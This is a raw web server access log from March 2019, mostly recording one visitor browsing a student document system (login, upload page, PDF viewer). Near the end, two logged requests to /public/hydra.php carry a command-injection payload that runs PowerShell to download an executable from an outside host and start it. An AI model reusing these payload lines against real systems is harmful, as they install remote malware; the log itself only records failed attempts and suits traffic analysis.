5.202.151.118 - - [27/Mar/2019:00:19:35 +0800] "GET / HTTP/1.1" 200 11418
1.85.218.81 - - [27/Mar/2019:19:27:55 +0800] "GET /ssmdm/images/nav3.jpg HTTP/1.1" 500 253952
1.85.218.81 - - [27/Mar/2019:19:27:55 +0800] "GET /ssmdm/images/nav2.jpg HTTP/1.1" 500 294912
1.85.218.81 - - [27/Mar/2019:19:27:55 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/easyui.css HTTP/1.1" 200 66948
1.85.218.81 - - [27/Mar/2019:19:27:56 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/jquery.min.js HTTP/1.1" 200 95957
1.85.218.81 - - [27/Mar/2019:19:27:59 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/jquery.easyui.min.js HTTP/1.1" 200 424333
1.85.218.81 - - [27/Mar/2019:19:27:59 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/icons/man.png HTTP/1.1" 200 244
1.85.218.81 - - [27/Mar/2019:19:27:59 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/passwordbox_open.png HTTP/1.1" 200 165
1.85.218.81 - - [27/Mar/2019:19:27:59 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/combo_arrow.png HTTP/1.1" 200 117
1.85.218.81 - - [27/Mar/2019:19:28:03 +0800] "GET /ssmdm/images/logo.png HTTP/1.1" 200 556002
1.85.218.81 - - [27/Mar/2019:19:28:05 +0800] "POST /ssmdm/login HTTP/1.1" 500 16240
1.85.218.81 - - [27/Mar/2019:19:28:07 +0800] "POST /ssmdm/login HTTP/1.1" 200 3608
1.85.218.81 - - [27/Mar/2019:19:28:07 +0800] "GET /ssmdm/js/title.js HTTP/1.1" 200 747
1.85.218.81 - - [27/Mar/2019:19:28:07 +0800] "GET /ssmdm/css/Main.css HTTP/1.1" 200 581
1.85.218.81 - - [27/Mar/2019:19:28:07 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/tabs_icons.png HTTP/1.1" 200 150
1.85.218.81 - - [27/Mar/2019:19:28:07 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/panel_tools.png HTTP/1.1" 200 852
1.85.218.81 - - [27/Mar/2019:19:28:07 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/blank.gif HTTP/1.1" 200 43
1.85.218.81 - - [27/Mar/2019:19:28:07 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/accordion_arrows.png HTTP/1.1" 200 184
1.85.218.81 - - [27/Mar/2019:19:28:07 +0800] "GET /ssmdm/images/logo2.png HTTP/1.1" 200 33740
1.85.218.81 - - [27/Mar/2019:19:28:08 +0800] "GET /favicon.ico HTTP/1.1" 200 21630
1.85.218.81 - - [27/Mar/2019:19:28:10 +0800] "GET /ssmdm/stuUpload HTTP/1.1" 200 2831
1.85.218.81 - - [27/Mar/2019:19:28:10 +0800] "GET /ssmdm/js/student/fileUpload.js HTTP/1.1" 200 1142
1.85.218.81 - - [27/Mar/2019:19:30:00 +0800] "GET /ssmdm/toRead HTTP/1.1" 200 844
1.85.218.81 - - [27/Mar/2019:19:30:00 +0800] "GET /ssmdm/js/student/queryAllDoc.js HTTP/1.1" 200 4692
1.85.218.81 - - [27/Mar/2019:19:30:00 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/pagination_icons.png HTTP/1.1" 200 628
1.85.218.81 - - [27/Mar/2019:19:30:00 +0800] "POST /ssmdm/Student/queryAllDoc HTTP/1.1" 200 837
1.85.218.81 - - [27/Mar/2019:19:30:00 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/loading.gif HTTP/1.1" 200 1737
1.85.218.81 - - [27/Mar/2019:19:30:11 +0800] "GET /ssmdm/js/pdfjs/generic/web/viewer.html?file=/doc/10/2015/1001/1510064101/151006410199.pdf HTTP/1.1" 200 19600
1.85.218.81 - - [27/Mar/2019:19:30:11 +0800] "GET /ssmdm/js/pdfjs/generic/web/viewer.css HTTP/1.1" 200 46022
1.85.218.81 - - [27/Mar/2019:19:30:11 +0800] "GET /ssmdm/js/pdfjs/generic/web/compatibility.js HTTP/1.1" 200 17788
1.85.218.81 - - [27/Mar/2019:19:30:11 +0800] "GET /ssmdm/js/pdfjs/generic/web/debugger.js HTTP/1.1" 200 19583
1.85.218.81 - - [27/Mar/2019:19:30:11 +0800] "GET /ssmdm/js/pdfjs/generic/web/l10n.js HTTP/1.1" 200 29253
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/build/pdf.js HTTP/1.1" 200 261214
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/viewer.js HTTP/1.1" 200 249596
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-sidebarToggle.png HTTP/1.1" 200 225
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-viewOutline.png HTTP/1.1" 200 178
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-search.png HTTP/1.1" 200 309
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-viewThumbnail.png HTTP/1.1" 200 185
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-viewAttachments.png HTTP/1.1" 200 384
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/texture.png HTTP/1.1" 200 2418
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-openFile.png HTTP/1.1" 200 295
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-download.png HTTP/1.1" 200 259
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-menuArrows.png HTTP/1.1" 200 108
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-bookmark.png HTTP/1.1" 200 174
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-presentationMode.png HTTP/1.1" 200 321
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-print.png HTTP/1.1" 200 257
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-secondaryToolbarToggle.png HTTP/1.1" 200 243
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-pageDown.png HTTP/1.1" 200 238
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-zoomOut.png HTTP/1.1" 200 88
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-zoomIn.png HTTP/1.1" 200 136
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/toolbarButton-pageUp.png HTTP/1.1" 200 246
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/locale/locale.properties HTTP/1.1" 200 4314
1.85.218.81 - - [27/Mar/2019:19:30:15 +0800] "GET /ssmdm/js/pdfjs/generic/web/locale/zh-CN/viewer.properties HTTP/1.1" 200 6259
1.85.218.81 - - [27/Mar/2019:19:30:24 +0800] "GET /ssmdm/js/pdfjs/generic/build/pdf.worker.js HTTP/1.1" 200 1251607
1.85.218.81 - - [27/Mar/2019:19:30:25 +0800] "GET /doc/10/2015/1001/1510064101/151006410199.pdf HTTP/1.1" 200 70595
1.85.218.81 - - [27/Mar/2019:19:30:25 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/shadow.png HTTP/1.1" 200 290
1.85.218.81 - - [27/Mar/2019:19:30:25 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/loading-icon.gif HTTP/1.1" 200 2545
1.85.218.81 - - [27/Mar/2019:19:30:25 +0800] "GET /ssmdm/js/pdfjs/generic/web/images/loading-small.png HTTP/1.1" 200 7402
194.63.142.14 - - [27/Mar/2019:19:40:01 +0800] "-" 400 -
1.85.218.81 - - [27/Mar/2019:19:42:16 +0800] "GET /ssmdm/toRead HTTP/1.1" 200 844
1.85.218.81 - - [27/Mar/2019:19:42:16 +0800] "POST /ssmdm/Student/queryAllDoc HTTP/1.1" 200 837
1.85.218.81 - - [27/Mar/2019:19:42:31 +0800] "GET /ssmdm/ HTTP/1.1" 302 -
1.85.218.81 - - [27/Mar/2019:19:42:31 +0800] "GET /ssmdm/toTop HTTP/1.1" 200 12737
1.85.218.81 - - [27/Mar/2019:19:42:31 +0800] "GET /ssmdm/images/icon5.png HTTP/1.1" 404 949
1.85.218.81 - - [27/Mar/2019:19:42:31 +0800] "GET /ssmdm/images/icon3.png HTTP/1.1" 404 949
1.85.218.81 - - [27/Mar/2019:19:42:31 +0800] "GET /ssmdm/images/icon4.png HTTP/1.1" 404 949
1.85.218.81 - - [27/Mar/2019:19:42:31 +0800] "GET /ssmdm/images/nav_ico.png HTTP/1.1" 404 949
1.85.218.81 - - [27/Mar/2019:19:42:31 +0800] "GET /ssmdm/images/icon2.png HTTP/1.1" 404 949
1.85.218.81 - - [27/Mar/2019:19:42:42 +0800] "GET /ssmdm/images/nav2.jpg HTTP/1.1" 200 493564
1.85.218.81 - - [27/Mar/2019:19:42:44 +0800] "GET /ssmdm/images/nav3.jpg HTTP/1.1" 200 510569
1.85.218.81 - - [27/Mar/2019:19:42:46 +0800] "GET /ssmdm/images/nav1.jpg HTTP/1.1" 200 510569
1.85.218.81 - - [27/Mar/2019:19:42:46 +0800] "GET /ssmdm/images/nav4.jpg HTTP/1.1" 200 493564
176.15.210.73 - - [27/Mar/2019:19:56:52 +0800] "GET / HTTP/1.1" 200 11418
177.76.190.84 - - [27/Mar/2019:20:11:43 +0800] "GET / HTTP/1.1" 200 11418
47.105.212.24 - - [27/Mar/2019:21:23:24 +0800] "GET null null" 400 -
47.105.212.24 - - [27/Mar/2019:21:23:24 +0800] "GET null null" 400 -
47.105.212.24 - - [27/Mar/2019:21:23:24 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/mzbuurxvudkacxm12914.exe');start%20C:/Windows/temp/mzbuurxvudkacxm12914.exe HTTP/1.1" 404 983
80.82.70.187 - - [27/Mar/2019:22:21:01 +0800] "GET /cache/global/img/gs.gif HTTP/1.1" 404 997
47.105.201.212 - - [27/Mar/2019:23:18:47 +0800] "GET null null" 400 -
47.105.201.212 - - [27/Mar/2019:23:18:47 +0800] "GET null null" 400 -
47.105.201.212 - - [27/Mar/2019:23:18:47 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/zrauunamppmknqc14373.exe');start%20C:/Windows/temp/zrauunamppmknqc14373.exe HTTP/1.1" 404 983
